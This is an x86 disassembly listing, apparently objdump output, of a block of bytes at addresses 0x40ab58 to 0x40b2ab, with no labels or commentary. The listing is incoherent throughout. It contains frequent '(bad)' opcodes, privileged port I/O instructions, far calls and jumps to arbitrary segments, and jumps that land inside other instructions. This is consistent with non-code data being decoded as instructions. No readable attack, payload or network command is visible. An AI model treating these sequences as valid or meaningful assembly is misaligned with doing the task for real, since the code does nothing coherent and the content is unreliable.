  40ab58:	gs jo  0x40ab1d
  40ab5b:	pop    edi
  40ab5c:	test   DWORD PTR [edx-0x57718702],ebx
  40ab62:	outs   dx,BYTE PTR ds:[esi]
  40ab63:	pushf  
  40ab64:	mov    edx,0x3c2298c8
  40ab69:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ab6a:	adc    BYTE PTR [ecx+0x47],ch
  40ab6d:	ret    0x261c
  40ab70:	test   eax,0xb5bfbf74
  40ab75:	les    ecx,FWORD PTR [eax+0x7bc0de9]
  40ab7b:	adc    eax,0x93068676
  40ab80:	inc    edi
  40ab81:	arpl   WORD PTR [eax+0x102a599d],bp
  40ab87:	out    dx,al
  40ab88:	pop    ss
  40ab89:	daa    
  40ab8a:	retf   0x4688
  40ab8d:	add    eax,ebp
  40ab8f:	ins    BYTE PTR es:[di],dx
  40ab91:	pop    es
  40ab92:	adc    ebp,ecx
  40ab94:	(bad)  
  40ab95:	ins    BYTE PTR es:[edi],dx
  40ab96:	sub    edx,DWORD PTR [esp+edx*8]
  40ab99:	mov    esp,0x101c020
  40ab9e:	call   0x916a:0xddf7cd09
  40aba5:	or     eax,0x1d0feedc
  40abaa:	retf   0x67f4
  40abad:	int3   
  40abae:	and    BYTE PTR [ebx],bl
  40abb0:	shl    BYTE PTR [edx-0x70],cl
  40abb3:	mov    WORD PTR [ebp+esi*2+0x7d],es
  40abb7:	dec    esp
  40abb8:	sub    edi,0x618b5c1b
  40abbe:	push   ecx
  40abbf:	adc    ebx,DWORD PTR [esi-0x3d]
  40abc2:	adc    BYTE PTR [eax-0x28],al
  40abc5:	in     eax,0x9a
  40abc7:	sahf   
  40abc8:	jg     0x40abe2
  40abca:	mov    ecx,DWORD PTR [ebx+0x58]
  40abcd:	jno    0x40ab67
  40abcf:	push   0x387071c8
  40abd4:	add    edi,DWORD PTR [ebp+0x31]
  40abd7:	call   0x13d5:0xc067352e
  40abde:	call   0x674e:0x6aad9ed4
  40abe5:	in     eax,dx
  40abe6:	jae    0x40ac20
  40abe8:	ror    BYTE PTR ds:0xf656430b,0xd8
  40abef:	xacquire xchg DWORD PTR [edx],esi
  40abf2:	rcr    DWORD PTR [ebx+0x37],1
  40abf5:	fcmovnu st,st(0)
  40abf7:	das    
  40abf8:	cmp    dl,BYTE PTR [ecx]
  40abfa:	aad    0xa8
  40abfc:	or     eax,0xc8e44ec3
  40ac01:	leave  
  40ac02:	push   ds
  40ac03:	stos   DWORD PTR es:[edi],eax
  40ac04:	add    dh,dl
  40ac06:	cmp    DWORD PTR [ebx-0xca3522c],ebp
  40ac0c:	je     0x40abe9
  40ac0e:	nop    DWORD PTR [edi]
  40ac11:	test   edx,edx
  40ac13:	lods   al,BYTE PTR ds:[esi]
  40ac14:	jg     0x40abf7
  40ac16:	mov    ah,0x61
  40ac18:	(bad)  
  40ac19:	sub    esi,DWORD PTR [ecx+0x2a]
  40ac1c:	mov    ecx,0x30f95892
  40ac21:	jge    0x40abaf
  40ac23:	xchg   ebx,eax
  40ac24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ac25:	jl     0x40ac95
  40ac27:	push   ebx
  40ac28:	inc    edx
  40ac29:	jmp    0xc1c0:0x45f0ef93
  40ac30:	lahf   
  40ac31:	(bad)  
  40ac33:	bnd jl 0x40ac27
  40ac36:	jbe    0x40ac11
  40ac38:	sti    
  40ac39:	xchg   esi,eax
  40ac3a:	out    0xcc,al
  40ac3c:	sar    BYTE PTR [edx+0x5a],1
  40ac3f:	es mov bl,0x12
  40ac42:	xchg   ebp,eax
  40ac43:	sub    dl,BYTE PTR [edi-0x28]
  40ac46:	hlt    
  40ac47:	hlt    
  40ac48:	mov    al,ds:0x4fe2592f
  40ac4d:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  40ac4f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ac50:	xchg   edx,eax
  40ac51:	cmp    cl,BYTE PTR [ecx-0xe]
  40ac54:	outs   dx,DWORD PTR ds:[esi]
  40ac55:	test   DWORD PTR [esi+0x79feab18],0xe6a95729
  40ac5f:	retf   
  40ac60:	sub    cl,al
  40ac62:	shr    dh,0x94
  40ac65:	div    BYTE PTR [edi-0x70c67419]
  40ac6b:	jne    0x40ac2f
  40ac6d:	out    dx,al
  40ac6e:	inc    edx
  40ac6f:	jo     0x40acb1
  40ac71:	stos   DWORD PTR es:[edi],eax
  40ac72:	call   0x8af44e04
  40ac77:	leave  
  40ac78:	fcomp  QWORD PTR [ecx]
  40ac7a:	pushf  
  40ac7b:	jns    0x40ace9
  40ac7d:	xor    dl,BYTE PTR [esi+0x64]
  40ac80:	mov    WORD PTR [edx+0x6c7dc98d],fs
  40ac86:	fld    DWORD PTR [eax]
  40ac88:	mov    ebx,ss
  40ac8a:	arpl   di,dx
  40ac8c:	aas    
  40ac8d:	mov    esp,0x918b9f93
  40ac92:	adc    eax,0x9896028b
  40ac97:	int    0x62
  40ac99:	mov    ss,ebp
  40ac9b:	add    ch,BYTE PTR [ebx-0x5c]
  40ac9e:	mov    ds:0x5c802cb6,al
  40aca3:	enter  0x154c,0x0
  40aca7:	sbb    ch,cl
  40aca9:	inc    esi
  40acaa:	fild   WORD PTR [esp+ebx*1+0x70]
  40acae:	lods   eax,DWORD PTR ds:[esi]
  40acaf:	or     ebx,ebp
  40acb1:	ret    0xe5e6
  40acb4:	mov    ds:0xb0fa0ebf,al
  40acb9:	rol    bh,0xa
  40acbc:	sub    cl,BYTE PTR [edx+0x42f9cb60]
  40acc2:	or     bl,dl
  40acc4:	sbb    dh,ch
  40acc6:	int    0x34
  40acc8:	inc    eax
  40acc9:	lds    eax,FWORD PTR [edi]
  40accb:	(bad)  
  40accc:	lods   al,BYTE PTR ds:[esi]
  40accd:	mov    DWORD PTR [ecx],ebp
  40accf:	adc    eax,0x235c18a3
  40acd4:	mov    al,0xc2
  40acd6:	and    ch,cl
  40acd8:	mov    bl,0xdf
  40acda:	repnz (bad) 
  40acdc:	mov    BYTE PTR [ebp+0x40],cl
  40acdf:	add    DWORD PTR gs:[ebp-0x78],0xe5cf1dc2
  40ace7:	mov    ds:0x75cf0b53,al
  40acec:	fs mov ah,0xd7
  40acef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40acf0:	addr16 jns 0x40ad66
  40acf3:	push   ss
  40acf4:	sti    
  40acf5:	xchg   ebx,eax
  40acf6:	jecxz  0x40ad25
  40acf8:	dec    edx
  40acf9:	or     cl,cl
  40acfb:	xchg   BYTE PTR [edi],ch
  40acfd:	push   eax
  40acfe:	and    eax,0x84485d07
  40ad03:	repnz pop ds
  40ad05:	or     al,0x54
  40ad07:	popa   
  40ad08:	mov    ecx,0x1305e3f0
  40ad0d:	jne    0x40acd1
  40ad0f:	xor    eax,0x96b6e357
  40ad14:	push   ss
  40ad15:	mov    ds:0xc275a9f9,al
  40ad1a:	ret    0xd9b7
  40ad1d:	(bad)  
  40ad1e:	je     0x40acb8
  40ad20:	int    0xad
  40ad22:	aas    
  40ad23:	adc    DWORD PTR [esi+0x5b],edx
  40ad26:	xchg   ecx,eax
  40ad27:	lds    ebp,FWORD PTR [ebx-0x1ddc1532]
  40ad2d:	scas   eax,DWORD PTR es:[edi]
  40ad2e:	ret    0x16f1
  40ad31:	push   ss
  40ad32:	lods   eax,DWORD PTR ds:[esi]
  40ad33:	(bad)  [edi]
  40ad35:	xor    dl,al
  40ad37:	jmp    DWORD PTR [eax-0x3e]
  40ad3a:	loope  0x40ad7a
  40ad3c:	mov    ecx,0x4c8b4663
  40ad41:	bound  esp,QWORD PTR ss:[ebx+eax*2]
  40ad45:	mov    ecx,DWORD PTR [edi+0x5f]
  40ad48:	aad    0x4e
  40ad4a:	inc    esi
  40ad4b:	mov    eax,esp
  40ad4d:	(bad)  
  40ad4e:	scas   eax,DWORD PTR es:[di]
  40ad50:	in     al,dx
  40ad51:	mov    es,esi
  40ad53:	mov    edx,0x14fff19
  40ad58:	dec    esi
  40ad59:	fisttp WORD PTR [eax-0x3]
  40ad5c:	je     0x40adcf
  40ad5e:	leave  
  40ad5f:	xor    ebx,0xffffffad
  40ad62:	xor    bh,BYTE PTR ds:0x37710eb1
  40ad68:	(bad)  
  40ad69:	push   ebx
  40ad6a:	adc    DWORD PTR [ecx+0x3f],ebx
  40ad6d:	daa    
  40ad6e:	lods   eax,DWORD PTR ds:[esi]
  40ad6f:	push   ebp
  40ad70:	xor    al,0x9d
  40ad73:	sbb    al,ah
  40ad75:	cmp    BYTE PTR [esi],al
  40ad77:	sbb    al,0xa9
  40ad79:	xchg   ebx,eax
  40ad7a:	jg     0x40ad4d
  40ad7c:	and    BYTE PTR [ecx+edi*1],dh
  40ad7f:	xchg   esp,eax
  40ad80:	mov    esi,0x98693d7d
  40ad85:	aaa    
  40ad86:	xor    BYTE PTR [edx-0x5868e253],cl
  40ad8c:	aaa    
  40ad8d:	cmp    BYTE PTR [ebx],cl
  40ad8f:	mov    ds:0x27d31d55,al
  40ad94:	bnd ja 0x40adae
  40ad97:	dec    esi
  40ad98:	mov    eax,ebx
  40ad9a:	out    0xf8,eax
  40ad9c:	sti    
  40ad9d:	inc    eax
  40ad9e:	and    bl,BYTE PTR [ebx+0x11]
  40ada1:	xor    DWORD PTR [edi-0x6868156b],ebp
  40ada7:	loopne 0x40adda
  40ada9:	mov    ds:0xef771d45,eax
  40adae:	test   BYTE PTR [ecx],al
  40adb0:	mov    al,ds:0x9c47cb89
  40adb5:	aas    
  40adb6:	jmp    0xa272140e
  40adbb:	pop    ebp
  40adbc:	imul   ebx,DWORD PTR [ecx-0x5],0x44
  40adc0:	sbb    esi,esp
  40adc2:	jmp    0x583989b9
  40adc7:	and    dh,BYTE PTR ds:0x9127a9f1
  40adcd:	mul    BYTE PTR [ecx+0x4e]
  40add0:	int3   
  40add1:	and    eax,0xafc61f15
  40add6:	dec    eax
  40add7:	cmp    ecx,eax
  40add9:	mov    bh,0x86
  40addb:	shr    ah,1
  40addd:	(bad)  
  40adde:	popa   
  40addf:	sub    esi,DWORD PTR [edx]
  40ade1:	mov    dh,0x75
  40ade3:	push   0x29
  40ade5:	push   ebp
  40ade6:	cs adc dl,cl
  40ade9:	mov    dl,BYTE PTR [esi+0x7cfc0ed7]
  40adef:	fldenv [ebx-0x70ebff2]
  40adf5:	fwait
  40adf6:	ror    BYTE PTR [ebx+0x69cc6fd6],cl
  40adfc:	jbe    0x40ae63
  40adfe:	xchg   ebx,eax
  40adff:	dec    ebp
  40ae00:	add    ecx,ecx
  40ae02:	mov    eax,0x7f85c8a1
  40ae07:	sbb    BYTE PTR [esi+edx*2+0x520e3551],cl
  40ae0e:	out    dx,eax
  40ae0f:	scas   al,BYTE PTR es:[edi]
  40ae10:	jmp    0xc474c869
  40ae15:	mov    eax,ds:0x5e351d7c
  40ae1a:	and    ebx,DWORD PTR ss:[ebx+0x60]
  40ae1e:	pop    esp
  40ae1f:	dec    edx
  40ae20:	jno    0x40ae05
  40ae22:	inc    edi
  40ae23:	xor    al,0x6d
  40ae25:	push   esp
  40ae26:	cmp    eax,0x159b2242
  40ae2b:	and    edi,DWORD PTR [eax]
  40ae2d:	arpl   bp,si
  40ae2f:	(bad)  
  40ae30:	das    
  40ae31:	mov    al,ds:0x10ee6c81
  40ae36:	mov    bh,0x31
  40ae38:	leave  
  40ae39:	add    sp,ax
  40ae3c:	xchg   esp,eax
  40ae3d:	xchg   edx,eax
  40ae3e:	mov    edi,0x2bc7aba0
  40ae43:	xchg   DWORD PTR [edx],ecx
  40ae45:	add    DWORD PTR ds:[ebx+0x2ca17152],ebx
  40ae4c:	xchg   ebx,eax
  40ae4d:	out    0xd6,eax
  40ae4f:	jnp    0x40aebc
  40ae51:	call   0xe84a9434
  40ae56:	lds    edi,FWORD PTR [ebp-0x20]
  40ae59:	ins    BYTE PTR es:[edi],dx
  40ae5a:	push   esi
  40ae5b:	pop    esi
  40ae5c:	(bad)  
  40ae5d:	aaa    
  40ae5e:	xor    BYTE PTR [ecx],0xf8
  40ae61:	or     dl,dh
  40ae63:	imul   BYTE PTR [esi-0x58357991]
  40ae69:	mov    bl,0xe0
  40ae6b:	test   DWORD PTR [edi],0x1c0de8
  40ae71:	out    0xc4,al
  40ae73:	das    
  40ae74:	pop    esp
  40ae75:	fldcw  WORD PTR [ebp-0x24]
  40ae78:	mov    ?,WORD PTR [esi]
  40ae7a:	call   0x84adf3dd
  40ae7f:	enter  0x2e2b,0xf0
  40ae83:	ins    DWORD PTR es:[edi],dx
  40ae84:	adc    bl,BYTE PTR [edx+0x79]
  40ae87:	inc    eax
  40ae88:	xor    BYTE PTR [ebp+0x5ec48f3f],ch
  40ae8e:	lahf   
  40ae8f:	push   ebp
  40ae90:	stos   DWORD PTR es:[edi],eax
  40ae91:	xor    eax,0xc60b56d6
  40ae96:	pop    eax
  40ae97:	sbb    BYTE PTR [edi+eiz*2+0x168d9cf4],ch
  40ae9e:	ins    DWORD PTR es:[edi],dx
  40ae9f:	inc    eax
  40aea0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aea1:	lods   eax,DWORD PTR ds:[esi]
  40aea2:	outs   dx,DWORD PTR ds:[esi]
  40aea3:	ja     0x40aece
  40aea5:	arpl   WORD PTR fs:[edx-0x49],bx
  40aea9:	xchg   edi,eax
  40aeaa:	enter  0xcb72,0x9a
  40aeae:	retf   0xdb94
  40aeb1:	mov    ebp,DWORD PTR [ebx]
  40aeb3:	aas    
  40aeb4:	(bad)  
  40aeb5:	jmp    0x40aea9
  40aeb7:	push   ds
  40aeb8:	and    BYTE PTR [ebx+0x41c46019],al
  40aebe:	movaps XMMWORD PTR [edi+0x36],xmm4
  40aec2:	push   ss
  40aec3:	aad    0x17
  40aec5:	sub    dl,BYTE PTR [ebp-0x75]
  40aec8:	fadd   st(7),st
  40aeca:	push   ecx
  40aecb:	pop    ecx
  40aecc:	add    BYTE PTR [ebp-0xd98b3a6],ch
  40aed2:	mov    ch,BYTE PTR [edi+eax*8-0x284e2580]
  40aed9:	fidivr WORD PTR ds:0x682fce69
  40aedf:	inc    ecx
  40aee0:	ror    DWORD PTR [edx],1
  40aee2:	and    BYTE PTR [eax-0x46],ch
  40aee5:	xchg   DWORD PTR [eax+0x14],eax
  40aee8:	mov    esi,0xf51c8fb2
  40aeed:	or     eax,0xa479fbb7
  40aef2:	fimul  WORD PTR [edx+ecx*2]
  40aef5:	ret    0x24dc
  40aef8:	outs   dx,BYTE PTR ds:[esi]
  40aef9:	call   0xaa2cda83
  40aefe:	int    0xee
  40af00:	(bad)  
  40af01:	out    0x23,al
  40af03:	rcl    BYTE PTR [eax+0x3846e703],1
  40af09:	out    0x20,eax
  40af0b:	xchg   esi,eax
  40af0c:	int    0xfb
  40af0e:	mov    al,0x33
  40af10:	mov    ebp,0x87ebc76f
  40af15:	fstp   TBYTE PTR [ecx-0x6]
  40af19:	lea    ecx,[edi+0x77]
  40af1c:	repz rol BYTE PTR [ebx-0x643ddeb],0xa9
  40af24:	xor    al,BYTE PTR [edi-0x7e]
  40af27:	push   esp
  40af28:	in     al,dx
  40af29:	ja     0x40aefc
  40af2b:	jle    0x40af14
  40af2d:	mov    ecx,0x7fa1b338
  40af32:	lods   al,BYTE PTR ds:[esi]
  40af33:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40af34:	mov    eax,ds:0x8ae876f
  40af39:	cmp    eax,0x5fad06bc
  40af3e:	outs   dx,DWORD PTR ds:[esi]
  40af3f:	inc    ebp
  40af40:	cmp    DWORD PTR [edi-0x7d8b35e3],0x1e
  40af47:	fs stos BYTE PTR es:[edi],al
  40af49:	xor    al,0xb5
  40af4b:	add    al,BYTE PTR [edi-0x45391cf3]
  40af51:	lds    esi,FWORD PTR [esp+ebx*2+0x66]
  40af55:	aad    0x36
  40af57:	or     al,0xae
  40af59:	es push ebp
  40af5b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40af5c:	popf   
  40af5d:	add    edi,DWORD PTR [esi-0x79c69a77]
  40af63:	dec    edx
  40af64:	call   0x1111e991
  40af69:	and    al,0xce
  40af6b:	sub    ch,BYTE PTR [ebx]
  40af6d:	cmp    al,0x84
  40af6f:	lea    edx,[edi]
  40af71:	fisttp DWORD PTR [edi-0x7b]
  40af74:	mov    ebx,0x77b20d97
  40af79:	enter  0xb688,0xe7
  40af7d:	inc    ecx
  40af7e:	xor    al,0x73
  40af80:	lods   eax,DWORD PTR ds:[esi]
  40af81:	jmp    0x63fc5710
  40af86:	popa   
  40af87:	fiadd  WORD PTR [eax+0x71]
  40af8a:	(bad)  
  40af8b:	mov    WORD PTR [esi-0x7f],?
  40af8e:	cmp    cl,BYTE PTR [edi-0x6b]
  40af91:	adc    al,0x37
  40af93:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40af94:	dec    ebp
  40af95:	xor    al,dl
  40af97:	nop
  40af98:	add    bl,ah
  40af9a:	rcr    al,cl
  40af9c:	xchg   esi,eax
  40af9d:	dec    ebp
  40af9e:	inc    ebp
  40af9f:	mov    ebp,DWORD PTR [ecx+ebp*4+0x68]
  40afa3:	cmp    esi,edx
  40afa5:	or     cl,bh
  40afa7:	push   0x10
  40afa9:	xchg   esi,eax
  40afaa:	out    dx,al
  40afab:	xor    eax,0xf95073e8
  40afb0:	mov    eax,ds:0xf54a8366
  40afb5:	outs   dx,DWORD PTR ds:[esi]
  40afb6:	repz cwde 
  40afb8:	or     BYTE PTR [ebp-0x2a],ah
  40afbb:	push   ebp
  40afbc:	mov    eax,ds:0x2d7589db
  40afc1:	sbb    al,0x48
  40afc3:	into   
  40afc4:	outs   dx,DWORD PTR ds:[esi]
  40afc5:	ss cwde 
  40afc7:	pop    edi
  40afc8:	jl     0x40b041
  40afca:	add    al,0x9f
  40afcc:	sub    al,bh
  40afce:	adc    BYTE PTR [ecx],dl
  40afd0:	push   ebp
  40afd1:	fwait
  40afd2:	jle    0x40b01b
  40afd4:	jle    0x40af83
  40afd6:	stc    
  40afd7:	test   DWORD PTR [esi],edx
  40afd9:	adc    DWORD PTR [edx],esp
  40afdb:	aaa    
  40afdc:	retf   
  40afdd:	mov    ds:0xf320460b,eax
  40afe2:	pop    ebp
  40afe3:	sahf   
  40afe4:	jnp    0x40afaf
  40afe6:	xchg   esi,eax
  40afe7:	xchg   ebp,eax
  40afe8:	cmp    BYTE PTR [ecx+esi*2-0x49],0xe0
  40afed:	add    cl,BYTE PTR [esi]
  40afef:	mov    gs,WORD PTR [edx-0x6d42d14e]
  40aff5:	adc    eax,0xd397b785
  40affa:	out    0x6a,al
  40affc:	and    esp,edx
  40affe:	xor    ebx,DWORD PTR [ebp+0x4638da36]
  40b004:	xor    DWORD PTR [edi-0x4a74d7b8],edi
  40b00a:	cmp    edx,DWORD PTR [eax]
  40b00c:	into   
  40b00d:	out    dx,al
  40b00e:	in     al,0x9c
  40b010:	cs cmc 
  40b012:	leave  
  40b013:	pop    es
  40b014:	dec    ecx
  40b015:	dec    edi
  40b016:	mov    gs,WORD PTR [eax-0x13453eda]
  40b01c:	add    esi,0x28
  40b01f:	inc    esp
  40b020:	xchg   ecx,eax
  40b021:	ss out 0xf3,eax
  40b024:	add    dh,ah
  40b026:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b027:	and    ch,ch
  40b029:	jg     0x40afb0
  40b02b:	outs   dx,BYTE PTR ds:[esi]
  40b02c:	popf   
  40b02d:	mov    dl,dh
  40b02f:	mov    ebp,0x8fd31b67
  40b034:	or     DWORD PTR ds:0x267fcae1,0x559ffde
  40b03e:	lock mov cl,0x71
  40b041:	cwde   
  40b042:	inc    esp
  40b043:	outs   dx,BYTE PTR ds:[esi]
  40b044:	xchg   DWORD PTR [edi+ebx*2],esi
  40b047:	xor    eax,ebp
  40b049:	scas   al,BYTE PTR es:[edi]
  40b04a:	push   0x33
  40b04c:	std    
  40b04d:	push   ecx
  40b04e:	sub    al,0x6b
  40b050:	and    al,0x17
  40b052:	inc    ebp
  40b053:	sub    bl,BYTE PTR [edx]
  40b055:	pop    edx
  40b056:	pop    ss
  40b057:	ret    0x6fd2
  40b05a:	cdq    
  40b05b:	ja     0x40b06a
  40b05d:	jge    0x40b0d7
  40b05f:	jne    0x40b0d2
  40b061:	push   cs
  40b062:	lea    ebx,[edx]
  40b064:	fcomip st,st(6)
  40b066:	xlat   BYTE PTR ds:[ebx]
  40b067:	jae    0x40b07d
  40b069:	adc    BYTE PTR [ebx-0xa557d6a],0x77
  40b070:	xchg   edi,eax
  40b071:	(bad)  
  40b072:	mov    ds:0xe55e75b7,eax
  40b077:	call   FWORD PTR [edx+0x1d87971a]
  40b07d:	mov    ecx,0xc64d53ae
  40b082:	pop    ds
  40b083:	lock mov ds:0x3b3224fc,eax
  40b089:	aam    0x65
  40b08b:	add    dl,0x7c
  40b08e:	xor    edi,DWORD PTR [edx+0xd]
  40b091:	pop    edi
  40b092:	daa    
  40b093:	inc    ecx
  40b094:	ret    0x1c5
  40b097:	int    0xbd
  40b099:	adc    eax,DWORD PTR [eax]
  40b09b:	not    BYTE PTR [esi]
  40b09d:	sub    eax,0xe7e79140
  40b0a2:	or     eax,ebp
  40b0a4:	sub    cl,0x1
  40b0a7:	(bad)  
  40b0a8:	jns    0x40b0cd
  40b0aa:	push   eax
  40b0ab:	cmp    DWORD PTR [edi+0x531a63ef],ebp
  40b0b1:	or     dl,BYTE PTR [ebx+0x4b]
  40b0b4:	kxnord k5,k1,k2
  40b0b9:	push   0xffffffae
  40b0bb:	call   0xf473d1d7
  40b0c0:	les    edx,FWORD PTR [ebx-0x32]
  40b0c3:	mov    edx,0xfeab6978
  40b0c8:	push   es
  40b0c9:	enter  0x4d04,0x99
  40b0cd:	sbb    DWORD PTR [ebp-0x1f283b8c],ebp
  40b0d3:	sub    ch,BYTE PTR [ebx+0x63]
  40b0d6:	xchg   DWORD PTR [esi+0x71],esi
  40b0d9:	mov    dh,0x74
  40b0db:	cld    
  40b0dc:	outs   dx,BYTE PTR ds:[esi]
  40b0dd:	ins    BYTE PTR es:[edi],dx
  40b0de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b0df:	and    DWORD PTR [edi-0x2aabc9ef],0x31
  40b0e6:	adc    BYTE PTR ds:[eax],dh
  40b0e9:	sti    
  40b0ea:	pop    esi
  40b0eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b0ec:	cmc    
  40b0ed:	sub    esi,esp
  40b0ef:	sbb    DWORD PTR [ebx-0x8],0xffffffbf
  40b0f3:	cld    
  40b0f4:	inc    edi
  40b0f5:	add    ebp,DWORD PTR [ebp+0x3aefca63]
  40b0fb:	pop    ds
  40b0fc:	or     eax,0x22520f8e
  40b101:	in     eax,0x3a
  40b103:	mov    cl,0x8a
  40b105:	dec    esi
  40b106:	out    0xb2,eax
  40b108:	scas   eax,DWORD PTR es:[edi]
  40b109:	dec    edi
  40b10a:	mov    ecx,DWORD PTR [eax+0x38]
  40b10d:	loope  0x40b0df
  40b10f:	gs test al,0xbf
  40b112:	loop   0x40b099
  40b114:	xor    BYTE PTR [esi+0x31ec74f1],dl
  40b11a:	mov    ebp,DWORD PTR [edx-0x31866b95]
  40b120:	or     DWORD PTR [eax+0x2aca1893],0xe53cdeab
  40b12a:	std    
  40b12b:	mov    bh,ah
  40b12d:	pop    edi
  40b12e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b12f:	in     eax,0xb4
  40b131:	icebp  
  40b132:	xor    eax,DWORD PTR [ebx+ecx*2-0x7bb68384]
  40b139:	adc    dl,bh
  40b13b:	out    dx,al
  40b13c:	scas   eax,DWORD PTR es:[edi]
  40b13d:	push   es
  40b13e:	push   eax
  40b13f:	jne    0x40b0e1
  40b141:	jno    0xfde5c13f
  40b147:	adc    al,0xb7
  40b149:	icebp  
  40b14a:	int3   
  40b14b:	or     ecx,ebp
  40b14d:	mov    ds,eax
  40b14f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b150:	or     BYTE PTR [edi],dl
  40b152:	sbb    BYTE PTR [eax+0x70],ch
  40b155:	push   eax
  40b156:	jo     0x40b111
  40b158:	xchg   edx,eax
  40b159:	push   edi
  40b15a:	xchg   BYTE PTR [ebx],cl
  40b15c:	fimul  WORD PTR [ecx+eiz*1+0xa]
  40b160:	xchg   ebx,ebx
  40b162:	out    dx,al
  40b163:	fisubr WORD PTR [ecx-0x67bf4588]
  40b169:	inc    ebp
  40b16a:	sub    DWORD PTR [ecx+0x2f3e9efa],ecx
  40b170:	fld    st(3)
  40b172:	hlt    
  40b173:	and    al,0xfa
  40b175:	mov    dl,0xa6
  40b177:	ins    BYTE PTR es:[edi],dx
  40b178:	mov    ebx,0xba3ca36a
  40b17d:	imul   ebx,DWORD PTR [ebx],0xffffffaf
  40b180:	lds    edx,FWORD PTR [eax-0x79]
  40b183:	xor    ch,BYTE PTR [eax+0x4a]
  40b186:	popf   
  40b187:	mov    es,edi
  40b189:	es addr16 mov esp,?
  40b18d:	outs   dx,DWORD PTR ds:[esi]
  40b18e:	jl     0x40b15d
  40b190:	xchg   ebx,eax
  40b191:	xchg   DWORD PTR [ecx-0x12],esp
  40b194:	jo     0x40b1b7
  40b196:	mov    ah,0x45
  40b198:	scas   eax,DWORD PTR es:[edi]
  40b199:	sbb    dl,BYTE PTR [edx]
  40b19b:	add    eax,0x8645fe9d
  40b1a0:	retf   0x7f06
  40b1a3:	pop    edi
  40b1a4:	cli    
  40b1a5:	scas   eax,DWORD PTR es:[edi]
  40b1a6:	js     0x40b1e7
  40b1a8:	int3   
  40b1a9:	test   DWORD PTR [esi-0x14c55d5f],ebp
  40b1af:	rcl    DWORD PTR [ebx+0x56],1
  40b1b2:	dec    esp
  40b1b3:	(bad)  
  40b1b4:	cmp    eax,0xbad7f977
  40b1b9:	call   0xb77cb4e
  40b1be:	(bad)  
  40b1bf:	test   DWORD PTR [ebp+0x20],0x1146dfac
  40b1c6:	xchg   ecx,eax
  40b1c7:	add    dl,BYTE PTR [ebx]
  40b1c9:	xchg   ecx,eax
  40b1ca:	inc    ebp
  40b1cb:	mov    bh,0x37
  40b1cd:	loope  0x40b18e
  40b1cf:	nop
  40b1d0:	or     al,0x93
  40b1d2:	sbb    BYTE PTR [ecx+0x6d634de9],bh
  40b1d8:	outs   dx,BYTE PTR ds:[esi]
  40b1d9:	mov    ds:0xbf36be72,al
  40b1de:	imul   esi,DWORD PTR [ebx-0x52],0x24
  40b1e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b1e3:	xchg   eax,ebp
  40b1e5:	imul   ebx,DWORD PTR [ecx-0x7b],0x3d690344
  40b1ec:	push   eax
  40b1ed:	hlt    
  40b1ee:	(bad)  
  40b1ef:	or     al,0x24
  40b1f1:	(bad)  
  40b1f2:	fadd   QWORD PTR [edx-0x6f]
  40b1f5:	pop    esp
  40b1f6:	shl    DWORD PTR [ecx-0x3dc94ccc],1
  40b1fc:	and    ch,BYTE PTR [eax-0xd]
  40b1ff:	and    eax,0x3838577d
  40b204:	aaa    
  40b205:	call   0x6e48:0x5002df30
  40b20c:	mov    ds:0x50cdcae8,al
  40b211:	jge    0x40b22e
  40b213:	ret    
  40b214:	daa    
  40b215:	sti    
  40b216:	mov    ebx,0xd80024cf
  40b21b:	rcl    DWORD PTR [edx-0x20],cl
  40b21e:	cdq    
  40b21f:	cs out 0x46,eax
  40b222:	mov    al,0x5a
  40b224:	bound  edx,QWORD PTR [ebx+ecx*4]
  40b227:	and    eax,0xdeb6c203
  40b22c:	pop    ebp
  40b22d:	retf   
  40b22e:	(bad)  
  40b22f:	pushf  
  40b230:	add    eax,DWORD PTR ds:0x6058765d
  40b236:	test   DWORD PTR [ebx+eax*8],0xf80d08ad
  40b23d:	popf   
  40b23e:	(bad)  
  40b23f:	xchg   esp,eax
  40b240:	inc    eax
  40b241:	loopne 0x40b23b
  40b243:	repz jb 0x40b1fa
  40b246:	dec    edx
  40b247:	jl     0x40b2c2
  40b249:	outs   dx,DWORD PTR ds:[esi]
  40b24a:	adc    DWORD PTR [esi+ebx*8],0xffffffbc
  40b24e:	adc    dl,BYTE PTR [edx+0x45]
  40b251:	push   esp
  40b252:	add    dl,BYTE PTR [esi+edx*2-0x11]
  40b256:	outs   dx,BYTE PTR ds:[esi]
  40b257:	and    al,0x90
  40b259:	mov    esi,0x671a1912
  40b25e:	pop    ebx
  40b25f:	add    edi,esp
  40b261:	es (bad) 
  40b263:	and    al,0x6d
  40b265:	ret    
  40b266:	mov    BYTE PTR [ebx+eiz*8-0x1a],bh
  40b26a:	es sub eax,ecx
  40b26d:	jmp    0x8569aef4
  40b272:	jle    0x40b278
  40b274:	ds push cs
  40b276:	arpl   WORD PTR [ebp+0x6b855050],si
  40b27c:	xlat   BYTE PTR ds:[ebx]
  40b27d:	mov    eax,edx
  40b27f:	inc    eax
  40b280:	adc    edx,edx
  40b282:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b283:	jnp    0x40b26b
  40b285:	jne    0x40b25d
  40b287:	sti    
  40b288:	or     BYTE PTR [edi-0x44],dl
  40b28b:	pop    ss
  40b28c:	and    al,0x92
  40b28e:	enter  0xb876,0xd0
  40b292:	stos   DWORD PTR es:[edi],eax
  40b293:	adc    edx,ebp
  40b295:	mov    cl,0x30
  40b297:	iret   
  40b298:	push   esi
  40b299:	sbb    ebx,DWORD PTR [edi-0x21c85fd]
  40b29f:	mov    al,0x31
  40b2a1:	xor    ebp,DWORD PTR [edi]
  40b2a3:	in     eax,dx
  40b2a4:	leave  
  40b2a5:	shl    BYTE PTR [ecx-0x67032114],cl
  40b2ab:	sti    
